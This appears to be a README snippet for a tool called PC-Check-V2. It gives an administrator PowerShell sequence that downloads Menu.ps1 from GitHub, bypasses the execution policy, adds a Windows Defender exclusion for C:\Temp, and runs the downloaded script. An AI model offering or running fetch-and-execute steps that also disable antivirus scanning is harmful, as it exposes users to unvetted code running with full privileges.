# PC-Check-V2 (Administrator)

```
New-Item -Path "C:\Temp\Scripts" -ItemType Directory -Force | Out-Null
Set-Location "C:\Temp\Scripts"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Onexion/PC-Check-V2/main/Menu.ps1" -OutFile "Menu.ps1"
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
Add-MpPreference -ExclusionPath 'C:\Temp' | Out-Null
.\Menu.ps1
```
